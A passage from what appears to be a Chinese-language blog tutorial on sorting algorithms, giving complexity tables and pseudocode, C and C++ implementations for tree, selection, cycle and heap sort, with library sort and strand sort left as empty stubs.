z = <span class="built_in">make_shared</span>&lt;BSNode&gt;(e);</span><br><span class="line">        <span class="keyword">decltype</span>(z) y = <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">decltype</span>(z) x = root;</span><br><span class="line">        <span class="keyword">while</span> (x) &#123;</span><br><span class="line">            y = x;</span><br><span class="line">            <span class="keyword">if</span> (x-&gt;<span class="built_in">getE</span>() &gt; e)</span><br><span class="line">                x = x-&gt;<span class="built_in">getL</span>();</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                x = x-&gt;<span class="built_in">getR</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!y) &#123;</span><br><span class="line">            root = z;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (y-&gt;<span class="built_in">getE</span>() &gt; e)</span><br><span class="line">                y-&gt;<span class="built_in">getL</span>() = z;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                y-&gt;<span class="built_in">getR</span>() = z;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">inorder_I</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">        PBSNode x = root;</span><br><span class="line">        stack&lt;<span class="keyword">decltype</span>(x)&gt; S;</span><br><span class="line">        <span class="keyword">while</span> (x) &#123;</span><br><span class="line">            <span class="keyword">while</span> (x) &#123;</span><br><span class="line">                <span class="keyword">if</span> (x-&gt;<span class="built_in">getR</span>())</span><br><span class="line">                    S.<span class="built_in">push</span>(x-&gt;<span class="built_in">getR</span>());</span><br><span class="line">                S.<span class="built_in">push</span>(x);</span><br><span class="line">                x = x-&gt;<span class="built_in">getL</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            x = S.<span class="built_in">top</span>();</span><br><span class="line">            S.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">while</span> (!S.<span class="built_in">empty</span>() &amp;&amp; !x-&gt;<span class="built_in">getR</span>()) &#123;</span><br><span class="line">                A[i++] = x-&gt;<span class="built_in">getE</span>();</span><br><span class="line">                x = S.<span class="built_in">top</span>();</span><br><span class="line">                S.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            A[i++] = x-&gt;<span class="built_in">getE</span>();</span><br><span class="line">            <span class="keyword">if</span> (S.<span class="built_in">empty</span>())</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            x = S.<span class="built_in">top</span>();</span><br><span class="line">            S.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">clear_I</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        PBSNode x = root;</span><br><span class="line">        stack&lt;<span class="keyword">decltype</span>(x)&gt; S;</span><br><span class="line">        <span class="keyword">while</span> (x) &#123;</span><br><span class="line">            <span class="keyword">if</span> (x-&gt;<span class="built_in">getR</span>())</span><br><span class="line">                S.<span class="built_in">push</span>(x-&gt;<span class="built_in">getR</span>());</span><br><span class="line">            <span class="keyword">if</span> (x-&gt;<span class="built_in">getL</span>())</span><br><span class="line">                S.<span class="built_in">push</span>(x-&gt;<span class="built_in">getL</span>());</span><br><span class="line">            x = <span class="literal">nullptr</span>;</span><br><span class="line">            <span class="keyword">if</span> (S.<span class="built_in">empty</span>())</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            x = S.<span class="built_in">top</span>();</span><br><span class="line">            S.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    PBSNode root;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">TreeSort</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> n = A.<span class="built_in">size</span>();</span><br><span class="line">    BSTree T;</span><br><span class="line">    <span class="keyword">switch</span>(t) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; e : A)</span><br><span class="line">                    T.<span class="built_in">insert_R</span>(T.<span class="built_in">getRoot</span>(), e);</span><br><span class="line">                <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">                T.<span class="built_in">inorder_R</span>(T.<span class="built_in">getRoot</span>(), A, i);</span><br><span class="line">                T.<span class="built_in">clear_R</span>(T.<span class="built_in">getRoot</span>());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; e : A)</span><br><span class="line">                    T.<span class="built_in">insert_I</span>(e);</span><br><span class="line">                <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">                T.<span class="built_in">inorder_I</span>(A);</span><br><span class="line">                T.<span class="built_in">clear_I</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h3 id="图书馆排序"><a href="#图书馆排序" class="headerlink" title="图书馆排序"></a>图书馆排序</h3><table>
<thead>
<tr>
<th align="left">Name</th>
<th align="left">Best</th>
<th align="left">Average</th>
<th align="left">Worst</th>
<th align="left">Memory</th>
<th align="left">Stable</th>
<th align="left">Method</th>
<th align="left">Notes</th>
</tr>
</thead>
<tbody><tr>
<td align="left">LibrarySort</td>
<td align="left">$n\log n$</td>
<td align="left">$n\log n$</td>
<td align="left">$n^2$</td>
<td align="left">n</td>
<td align="left">no</td>
<td align="left">插入</td>
<td align="left"></td>
</tr>
</tbody></table>
<div class="tabs" id="librarysort"><ul class="nav-tabs"><li class="tab active"><a href="#librarysort-1">Pseudo</a></li><li class="tab"><a href="#librarysort-2">C</a></li><li class="tab"><a href="#librarysort-3">C++</a></li></ul><div class="tab-content"><div class="tab-pane active" id="librarysort-1"><figure class="highlight ps"><table><tr><td class="code"><pre><span class="line">LibrarySort(A[<span class="type">n</span>])</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="librarysort-2"><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">LibrarySort</span><span class="params">(<span class="type">int</span> A[], <span class="type">int</span> n)</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="librarysort-3"><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">LibrarySort</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="选择类"><a href="#选择类" class="headerlink" title="选择类"></a>选择类</h2><h3 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h3><p>每次遍历数据时，当前元素应放置最小值，因此在剩余的未排序数据中找出最小值，然后与当前元素交换即可。</p>
<table>
<thead>
<tr>
<th align="left">Name</th>
<th align="left">Best</th>
<th align="left">Average</th>
<th align="left">Worst</th>
<th align="left">Memory</th>
<th align="left">Stable</th>
<th align="left">Method</th>
<th align="left">Notes</th>
</tr>
</thead>
<tbody><tr>
<td align="left">SelectSort</td>
<td align="left">$n^2$</td>
<td align="left">$n^2$</td>
<td align="left">$n^2$</td>
<td align="left">1</td>
<td align="left">no</td>
<td align="left">选择</td>
<td align="left"></td>
</tr>
</tbody></table>
<div class="tabs" id="selectsort"><ul class="nav-tabs"><li class="tab active"><a href="#selectsort-1">Pseudo</a></li><li class="tab"><a href="#selectsort-2">C</a></li><li class="tab"><a href="#selectsort-3">C++</a></li></ul><div class="tab-content"><div class="tab-pane active" id="selectsort-1"><figure class="highlight ps"><table><tr><td class="code"><pre><span class="line">SelectSort(A[<span class="type">n</span>])</span><br><span class="line">    <span class="comment"># 从第1个元素开始，遍历到倒数第2个元素（最后一个元素一定有序）</span></span><br><span class="line">    <span class="keyword">for</span> i = <span class="number">1</span> to n<span class="literal">-1</span></span><br><span class="line">        <span class="comment"># 默认当前元素就是最小值</span></span><br><span class="line">        min = i</span><br><span class="line">        <span class="comment"># 从当前元素后一位开始搜索最小值</span></span><br><span class="line">        <span class="keyword">for</span> j = i+<span class="number">1</span> to n</span><br><span class="line">            <span class="keyword">if</span> A[<span class="type">min</span>] &gt; A[<span class="type">j</span>]</span><br><span class="line">                min = j</span><br><span class="line">        <span class="comment"># 将最小值元素与当前元素交换</span></span><br><span class="line">        swap(A[<span class="type">i</span>], A[<span class="type">min</span>])</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="selectsort-2"><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">SelectSort</span><span class="params">(<span class="type">int</span> A[], <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i, j, min, tmp;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n<span class="number">-1</span>; i++) &#123;</span><br><span class="line">        min = i;</span><br><span class="line">        <span class="keyword">for</span> (j = i+<span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (A[min] &gt; A[j]) &#123;</span><br><span class="line">                min = j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        tmp = A[i];</span><br><span class="line">        A[i] = A[min];</span><br><span class="line">        A[min] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="selectsort-3"><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SelectSort</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n = A.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n<span class="number">-1</span>; i++) &#123;</span><br><span class="line">        <span class="type">int</span> min = i;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = i+<span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (A[min] &gt; A[j]) &#123;</span><br><span class="line">                min = j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">swap</span>(A[i], A[min]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h3 id="圈排序"><a href="#圈排序" class="headerlink" title="圈排序"></a>圈排序</h3><p>1990年<code>B.K.HADDON</code>在<code>《The Computer Journal》</code>上发表圈排序算法。</p>
<p>对于输入数据<code>A[n]</code>，从左向右依次对每一个元素<code>A[i]</code>进行圈排序，此时<code>p=A[i]</code>即当前圈节点处于起始位置，左侧元素集有序且<code>L&lt;=A[i]</code>，右侧元素集无序且<code>R&gt;=A[i]</code>：</p>
<ol>
<li>在当前元素右侧<code>[i+1,n]</code>中统计小于当前圈节点<code>p</code>的元素数量<code>m</code>，则<code>p</code>的有序位置应为<code>A[i+m]</code>；</li>
<li>如果<code>m=0</code>，说明<code>p</code>的有序位置就是起始位置，即对当前元素圈排序结束，继续对下一个元素<code>A[i+1]</code>进行圈排序；<br>如果<code>m&gt;0</code>，将当前圈节点<code>p</code>放至有序位置<code>A[i+m]</code>，同时更新当前圈节点<code>p=A[i+m]</code>。重复上述步骤直至<code>m=0</code>。</li>
</ol>
<table>
<thead>
<tr>
<th align="left">Name</th>
<th align="left">Best</th>
<th align="left">Average</th>
<th align="left">Worst</th>
<th align="left">Memory</th>
<th align="left">Stable</th>
<th align="left">Method</th>
<th align="left">Notes</th>
</tr>
</thead>
<tbody><tr>
<td align="left">CycleSort</td>
<td align="left">$n^2$</td>
<td align="left">$n^2$</td>
<td align="left">$n^2$</td>
<td align="left">1</td>
<td align="left">no</td>
<td align="left">选择</td>
<td align="left">最优写数量的原址操作</td>
</tr>
</tbody></table>
<div class="tabs" id="cyclesort"><ul class="nav-tabs"><li class="tab active"><a href="#cyclesort-1">Pseudo</a></li><li class="tab"><a href="#cyclesort-2">C</a></li><li class="tab"><a href="#cyclesort-3">C++</a></li></ul><div class="tab-content"><div class="tab-pane active" id="cyclesort-1"><figure class="highlight ps"><table><tr><td class="code"><pre><span class="line">CycleSort(A[<span class="type">n</span>])</span><br><span class="line">    <span class="keyword">for</span> i = <span class="number">1</span> to n</span><br><span class="line">        <span class="comment"># 开始圈排序并计算当前元素的有序位置</span></span><br><span class="line">        p: A[<span class="type">i</span>]</span><br><span class="line">        m: nums of A[<span class="type">i</span>+<span class="number">1</span>,<span class="type">n</span>] &lt; p</span><br><span class="line">        <span class="keyword">if</span> m = <span class="number">0</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># 更新圈节点直至指向处于起始位置的元素</span></span><br><span class="line">        <span class="keyword">while</span> <span class="number">0</span> &lt; m</span><br><span class="line">            swap(p, A[<span class="type">i</span>+<span class="type">m</span>])</span><br><span class="line">            m = nums of A[<span class="type">i</span>+<span class="number">1</span>,<span class="type">n</span>] &lt; p</span><br><span class="line">        <span class="comment"># 将当前圈节点放至起始位置</span></span><br><span class="line">        A[<span class="type">i</span>] = p;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="cyclesort-2"><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">CycleSort</span><span class="params">(<span class="type">int</span> A[], <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i, j, p, m, tmp;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        p = A[i];</span><br><span class="line">        m = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (j = i+<span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (A[j] &lt; p)</span><br><span class="line">                m++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> == m)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">0</span> &lt; m) &#123;</span><br><span class="line">            tmp = p;</span><br><span class="line">            p = A[i+m];</span><br><span class="line">            A[i+m] = tmp;</span><br><span class="line"></span><br><span class="line">            m = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (j = i+<span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (A[j] &lt; p)</span><br><span class="line">                    m++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        A[i] = p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="cyclesort-3"><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CycleSort</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n = A.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="type">int</span> p = A[i];</span><br><span class="line">        <span class="type">int</span> m = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = i+<span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (A[j] &lt; p)</span><br><span class="line">                m++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> == m)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">0</span> &lt; m) &#123;</span><br><span class="line">            <span class="built_in">swap</span>(p, A[i+m]);</span><br><span class="line">            m = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = i+<span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (A[j] &lt; p)</span><br><span class="line">                    m++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        A[i] = p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h3 id="链排序"><a href="#链排序" class="headerlink" title="链排序"></a>链排序</h3><table>
<thead>
<tr>
<th align="left">Name</th>
<th align="left">Best</th>
<th align="left">Average</th>
<th align="left">Worst</th>
<th align="left">Memory</th>
<th align="left">Stable</th>
<th align="left">Method</th>
<th align="left">Notes</th>
</tr>
</thead>
<tbody><tr>
<td align="left">StrandSort</td>
<td align="left">n</td>
<td align="left">$n^2$</td>
<td align="left">$n^2$</td>
<td align="left">n</td>
<td align="left">yes</td>
<td align="left">选择</td>
<td align="left"></td>
</tr>
</tbody></table>
<div class="tabs" id="strandsort"><ul class="nav-tabs"><li class="tab active"><a href="#strandsort-1">Pseudo</a></li><li class="tab"><a href="#strandsort-2">C</a></li><li class="tab"><a href="#strandsort-3">C++</a></li></ul><div class="tab-content"><div class="tab-pane active" id="strandsort-1"><figure class="highlight ps"><table><tr><td class="code"><pre><span class="line">StrandSort(A[<span class="type">n</span>])</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="strandsort-2"><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">StrandSort</span><span class="params">(<span class="type">int</span> A[], <span class="type">int</span> n)</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="strandsort-3"><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">StrandSort</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h3 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h3><p>1964年<code>John William</code>发明此算法，提出自顶向下的方法将数组组织为堆，具体为申请新的堆空间后，从一个空堆开始，按顺序向逐渐增长的堆中添加元素。<br>1964年<code>Robert Floyd</code>提出自底向上的方法将数组原地转换为堆，具体为首先构造较小的堆，再将它们合并成很大的堆。<br><strong>堆</strong>是具有以下两个属性的二叉树：</p>
<ol>
<li>每个节点的值不会小于其子节点的值（保证了堆顶元素一定是最大值或最小值）;</li>
<li>树是完全平衡的，最底层的叶子节点都位于最左边的位置上（保证了所有元素在数组中无隙排序）。</li>
</ol>
<p><strong>堆排序</strong>可以看成对<a href="#%E9%80%89%E6%8B%A9%E6%8E%92%E5%BA%8F"><strong>选择排序</strong></a>的改进。堆排序每次将堆顶元素与最后一个元素交换，从尾部开始逐渐构建排序区域，利用<code>Floyd</code>提出的方法原地将以头部开始的未排序区域重新转换为堆，因此相对于选择排序加速了寻找最小值或最大值的过程。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">以计数I展示一个长度为N的堆时：                以索引i展示一个长度为N的堆时：</span><br><span class="line">        1                                           0</span><br><span class="line">    2       3                                   1       2</span><br><span class="line">  4   5   6   7                               3   4   5   6</span><br><span class="line"> 8 9                                         7 8</span><br><span class="line"> 左子树节点位置 L = 2I   = 2*2      = 4      左子树节点位置 L = 2i+1 = 2*1+1       = 3</span><br><span class="line"> 右子树节点位置 R = 2I+1 = 2*2+1    = 5      右子树节点位置 R = 2i+2 = 2*1+2       = 4</span><br><span class="line"> 最大子树节点位 P = N/2  = (8or9)/2 = 4      最大子树节点位 P = N/2-1 = (8or9)/2-1 = 3</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">Name</th>
<th align="left">Best</th>
<th align="left">Average</th>
<th align="left">Worst</th>
<th align="left">Memory</th>
<th align="left">Stable</th>
<th align="left">Method</th>
<th align="left">Notes</th>
</tr>
</thead>
<tbody><tr>
<td align="left">HeapSort</td>
<td align="left">$n\log n$</td>
<td align="left">$n\log n$</td>
<td align="left">$n\log n$</td>
<td align="left">1</td>
<td align="left">no</td>
<td align="left">选择</td>
<td align="left"></td>
</tr>
</tbody></table>
<div class="tabs" id="heapsort"><ul class="nav-tabs"><li class="tab active"><a href="#heapsort-1">Pseudo</a></li><li class="tab"><a href="#heapsort-2">C</a></li><li class="tab"><a href="#heapsort-3">C++</a></li></ul><div class="tab-content"><div class="tab-pane active" id="heapsort-1"><figure class="highlight ps"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将当前堆顶元素下坠到正确位置</span></span><br><span class="line"><span class="comment"># start 堆顶元素位置</span></span><br><span class="line"><span class="comment"># end   堆中最后的叶子元素位置</span></span><br><span class="line">Heapify(A, <span class="built_in">start</span>, <span class="keyword">end</span>)</span><br><span class="line">    <span class="comment"># 只要左子树存在，就需要下坠</span></span><br><span class="line">    L = <span class="number">2</span> * <span class="built_in">start</span></span><br><span class="line">    <span class="keyword">while</span> L &lt;= <span class="keyword">end</span></span><br><span class="line">        <span class="comment"># 当右子树存在，获取左右子树中较大的元素</span></span><br><span class="line">        largest = L</span><br><span class="line">        <span class="built_in">R</span> = L + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">R</span> &lt;= <span class="keyword">end</span></span><br><span class="line">            largest = max(A[<span class="type">largest</span>], A[<span class="type">R</span>])</span><br><span class="line">        <span class="comment"># 检查堆顶元素</span></span><br><span class="line">        <span class="keyword">if</span> A[<span class="type">start</span>] &lt; A[<span class="type">largest</span>]</span><br><span class="line">            <span class="comment"># 堆顶元素不是最大值，则把它换下去</span></span><br><span class="line">            swap(A[<span class="type">start</span>], A[<span class="type">largest</span>])</span><br><span class="line">            <span class="comment"># 继续处理子树</span></span><br><span class="line">            <span class="built_in">start</span> = largest</span><br><span class="line">            L = <span class="number">2</span> * <span class="built_in">start</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="comment"># 堆顶元素已经是最大值，直接退出</span></span><br><span class="line">            L = <span class="keyword">end</span> + <span class="number">1</span></span><br><span class="line">HeapSort(A[<span class="type">n</span>])</span><br><span class="line">    <span class="comment"># 构建堆：从最大子节点开始，自底向上依次将各节点的堆顶元素下坠到正确位置</span></span><br><span class="line">    <span class="keyword">for</span> i = n/<span class="number">2</span> to <span class="number">1</span></span><br><span class="line">        Heapify(A, i, n)</span><br><span class="line">    <span class="comment"># 排序：将堆顶元素交换到尾部正确位置，交换上来的元素重新下坠到正确位置</span></span><br><span class="line">    <span class="keyword">for</span> i = n to <span class="number">2</span></span><br><span class="line">        swap(A[<span class="number">1</span>], A[<span class="type">i</span>])</span><br><span class="line">        Heapify(A, <span class="number">1</span>, i<span class="literal">-1</span>)</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="heapsort-2"><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Heapify</span><span class="params">(<span class="type">int</span> A[], <span class="type">int</span> start, <span class="type">int</span> end)</span> &#123;</span><br><span class="line">    <span class="type">int</span> L, R, largest, tmp;</span><br><span class="line">    L = <span class="number">2</span> * start + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (L &lt;= end) &#123;</span><br><span class="line">        largest = L;</span><br><span class="line">        R = L + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (R &lt;= end &amp;&amp; A[largest] &lt; A[R]) &#123;</span><br><span class="line">            largest = R;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (A[start] &lt; A[largest]) &#123;</span><br><span class="line">            tmp = A[start];</span><br><span class="line">            A[start] = A[largest];</span><br><span class="line">            A[largest] = tmp;</span><br><span class="line">            start = largest;</span><br><span class="line">            L = <span class="number">2</span> * start + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            L = end + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">HeapSort</span><span class="params">(<span class="type">int</span> A[], <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i, tmp;</span><br><span class="line">    <span class="keyword">for</span> (i = n/<span class="number">2</span><span class="number">-1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        Heapify(A, i, n<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = n<span class="number">-1</span>; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">        tmp = A[i];</span><br><span class="line">        A[i] = A[<span class="number">0</span>];</span><br><span class="line">        A[<span class="number">0</span>] = tmp;</span><br><span class="line">        Heapify(A, <span class="number">0</span>, i<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="heapsort-3"><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Heapify</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; A, <span class="type">int</span> start, <span class="type">int</span> end)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n = A.<span class="built_in">size</span>();</span><br><span class="line">    <span class="type">int</span> L = <span class="number">2</span> * start + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (L &lt;= end) &#123;</span><br><span class="line">        <span class="type">int</span> largest = L;</span><br><span class="line">        <span class="type">int</span> R = L + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (R &lt;= end &amp;&amp; A[largest] &lt; A[R]) &#123;</span><br><span class="line">            largest = R;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (A[start] &lt; A[largest]) &#123;</span><br><span class="line">            <span class="built_in">swap</span>(A[start], A[largest]);</span><br><span class="line">            start = largest;</span><br><span class="line">            L = <span class="number">2</span> * start + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            L = end + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HeapSort</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n = A.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = n/<span class="number">2</span><span class="number">-1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="built_in">Heapify</span>(A, i, n<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = n<span class="number">-1</span>; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="built_in">swap</span>(A[<span class="number">0</span>], A[i]);</span><br><span class="line">        <span class="built_in">Heapify</span>(A, <span class="number">0</span>, i<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

